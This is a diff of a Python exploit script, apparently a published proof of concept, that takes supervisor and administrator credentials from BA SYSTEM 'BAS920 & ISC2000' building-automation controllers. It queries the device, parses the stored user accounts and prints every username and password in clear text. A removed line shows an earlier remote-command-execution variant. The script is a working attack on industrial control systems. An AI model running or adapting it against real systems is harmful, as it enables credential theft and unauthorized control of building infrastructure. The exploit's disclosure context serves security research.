@@ -18,38 +18,38 @@ class Colors:
 banner = '''
 
 		|=--------------------------------------------------------------------=|
-		|=-------=[ Server: "BAS920 & ISC2000" credentials exposed ]=---------=|
-		|=--------------------------=[ 22 nov 2017 ]=-------------------------=|
+		|=-------=[ SCADAS "BAS920 & ISC2000"; credentials exposed ]=---------=|
+		|=--------------------------=[ 29 dic 2017 ]=-------------------------=|
 		|=-------------------------=[  Researcher:  ]=------------------------=|
 		|=----------------------=[ Fernandez Ezequiel ]=----------------------=|
 		|=--------------------------------------------------------------------=|
 '''
 
 details = ''' 
- # Exploit Title: ****************************************** 
- # Date: 22/11/2017
- # Exploit Author: Fernandez Ezequiel ( @capitan_alfa )
- # Vendor: -------------------
- # Category: Building automation
+ # Exploit Title: 	SCADAS "BAS920 & ISC2000"; Credentials Exposed
+ # Date: 		22/12/2017
+ # Exploit Author: 	Fernandez Ezequiel ( @capitan_alfa )  && Bertin Jose ( @bertinjoseb )
+ # Vendor: 		BA SYSTEM
+ # Category: 		Building automation
 
 '''
 # https://en.wikipedia.org/wiki/Building_automation
 
-parser = argparse.ArgumentParser(prog='mykeysjson.py',
-								description=' [+] COMMANDS over your industrial control system .', 
-								epilog='[+] Demo: python rce.py --host <host> -ck <sessionCookie> --cmd "ls -la /" ',
-								version="1.0")
+parser = argparse.ArgumentParser(prog='cafeina.py',
+								description=' [+] obtaining the credential information for the Supervisor/Administrator account', 
+								epilog='[+] Demo: python cafeina.py --host 192.168.1.101 -p 81',
+								version="1.0.1")
 
 parser.add_argument('--host', 	dest="HOST",  	help='Host',	required=True)
 parser.add_argument('--port', 	dest="PORT",  	help='Port',	default=80)
-parser.add_argument('--mode', 	dest="MODE",  	help='Port', 	choices=['1','2'],	default=1)
+#parser.add_argument('--mode', 	dest="MODE",  	help='Port', 	choices=['1','2'],	default=1)
 
 
 args	= 	parser.parse_args()
 
 HST   	= 	args.HOST
 port 	= 	args.PORT
-atkTp 	= 	int(args.MODE)
+#atkTp 	= |	int(args.MODE)
 
 headers = {}
 
@@ -98,20 +98,18 @@ def getVersion():
 
 
 def getKeys():
-	if atkTp == 1:
-		r1 = requests.get(fullHost_1, headers=makeReqHeaders())
-	else:
-		r1 = requests.get(fullHost_2, headers=makeReqHeaders())
+	#if atkTp == 1:
+	r1 = requests.get(fullHost_1, headers=makeReqHeaders())
+	#else:
+	#	r1 = requests.get(fullHost_2, headers=makeReqHeaders())
 
 	headerSrv =  r1.headers["Server"]
 	return r1.text,headerSrv
-
-
-
 rawReq = []
 
 try:
-	rawReq = getKeys()
+	print details
+	rawReq = getKeys() # ----> Menuinit()
 except Exception as e:
 	#print e
 	print "[!] Connection aborted"
@@ -164,8 +162,8 @@ for usersUp in range(0,totUsr):
 	usuario 	= allUsers[usersUp]["name"]
 	password 	= allUsers[usersUp]["pass"]
 
-	email 		= allUsers[usersUp]["email"]
-	sms 		= allUsers[usersUp]["sms"]
+	#email 		= allUsers[usersUp]["email"]
+	#sms 		= allUsers[usersUp]["sms"]
 
 	print Colors.ORANGE+" |   "+str(sidlevel)+" | "+usuario+"\t\t\t"+"| "+password
 
